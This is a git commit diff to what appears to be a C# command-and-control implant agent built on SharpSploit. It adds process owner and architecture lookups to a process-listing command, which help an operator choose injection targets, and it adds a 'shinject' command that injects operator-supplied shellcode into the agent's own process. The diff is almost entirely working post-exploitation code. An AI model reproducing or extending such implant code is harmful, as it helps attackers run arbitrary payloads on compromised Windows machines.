1159ee83f1b05b163dc704ecb627eec936401c4e
poptartsommelier <rich.d.nospam@gmail.com>
2023-03-06 01:32:33 +0000

    shinject

--- Agent/Commands/ListProcesses.cs
+++ Agent/Commands/ListProcesses.cs
@@ -1,7 +1,9 @@
 ﻿using Agent.Models;
 using SharpSploit.Generic;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.Security.Principal;
 
 namespace Agent.Commands
 {
@@ -24,6 +26,8 @@ namespace Agent.Commands
                 };
 
                 result.ProcessPath = GetProcessPath(process);
+                result.Owner = GetProcessOwner(process);
+                result.Arch = GetProcessArch(process);
                 results.Add(result);
             }
 
@@ -41,20 +45,69 @@ namespace Agent.Commands
                 return "-";
             }
         }
+
+        private string GetProcessOwner(Process process)
+        {
+            var hToken = IntPtr.Zero;
+
+            try
+            {
+                if (!Native.Advapi.OpenProcessToken(process.Handle, (uint)Native.Advapi.DesiredAccess.TOKEN_ALL_ACCESS, out hToken))
+                    return "-";
+
+                var identity = new WindowsIdentity(hToken);
+                return identity.Name;
+            }
+            catch
+            {
+                return "-";
+            }
+            finally
+            {
+                Native.Kernel32.CloseHandle(hToken);
+            }
+        }
+
+        private string GetProcessArch(Process process)
+        {
+            try
+            {
+                var is64BitOS = Environment.Is64BitOperatingSystem;
+
+                if (!is64BitOS)
+                    return "x86";
+
+                if (!Native.Kernel32.IsWow64Process(process.Handle, out var isWow64))
+                    return "-";
+
+                if (is64BitOS && isWow64)
+                    return "x86";
+
+                return "x64";
+            }
+            catch
+            {
+                return "-";
+            }
+        }
     }
     public sealed class ListProcessesResult : SSResult
     {
         public string ProcessName { get; set; }
         public string ProcessPath { get; set; }
+        public string Owner { get; set; }
         public int ProcessId { get; set; }
         public int SessionId { get; set; }
+        public string Arch { get; set; }
 
         protected internal override IList<SSResultProperty> ResultProperties => new List<SSResultProperty>
         {
             new SSResultProperty{Name = nameof(ProcessName), Value = ProcessName },
             new SSResultProperty{Name = nameof(ProcessPath), Value = ProcessPath },
+            new SSResultProperty{Name = nameof(Owner), Value = Owner},
             new SSResultProperty{Name = "PID", Value = ProcessId },
-            new SSResultProperty{Name = nameof(SessionId), Value = SessionId }
+            new SSResultProperty{Name = nameof(SessionId), Value = SessionId },
+            new SSResultProperty{Name = nameof(Arch), Value = Arch }
         };
     }
 }
---
+++ Agent/Commands/ShellCodeInject.cs
@@ -0,0 +1,23 @@
+﻿using Agent.Internal;
+using Agent.Models;
+
+namespace Agent.Commands
+{
+    public class ShellCodeInject : AgentCommand
+    {
+        public override string Name => "shinject";
+
+        public override string Execute(AgentTask task)
+        {
+            var injector = new SelfInjector();
+            var success = injector.Inject(task.FileBytes);
+
+            if (success)
+            {
+                return "Shellcode injected";
+            }
+            else
+                return "Failed to inject shellcode";
+        }
+    }
+}
